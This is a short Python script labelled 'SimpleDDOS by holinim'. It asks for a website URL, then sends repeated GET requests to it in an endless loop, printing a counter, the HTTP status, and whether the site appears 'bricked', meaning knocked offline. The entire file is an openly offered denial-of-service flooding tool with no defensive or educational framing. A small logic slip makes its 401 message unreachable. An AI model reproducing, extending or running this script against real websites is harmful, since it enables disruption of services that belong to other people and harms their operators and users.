import requests
codes = [100, 101, 102, 103, 200, 201, 202, 203, 204, 205, 206, 207, 208, 226, 300, 301, 302, 303, 304, 305, 306, 307, 308]
def clear():
    print("\n"*100)
counter=0
url = input("SimpleDDOS\nby holinim\nEnter site url (with https:// or http://):\n> ")
showcontentraw = input("Show site content? [Y/N]\n> ")
if showcontentraw=="Y" or showcontentraw=="y":
    showcontent=True
else:
    showcontent=False
try:
    while True:
        clear()
        counter+=1
        requests.get(url)
        requests.get(url)
        requests.get(url)
        r = requests.get(url)
        if r.status_code not in codes:
            brick="true"
        elif r.status_code==401:
            brick="false, authorization is required"
        else:
            brick="false"
        print(f"Request pack #{counter}\nHTTP code - {r.status_code}\nIs brick - {brick}")
except:
    print("You entered wrong URL or you don't have internet connection.")
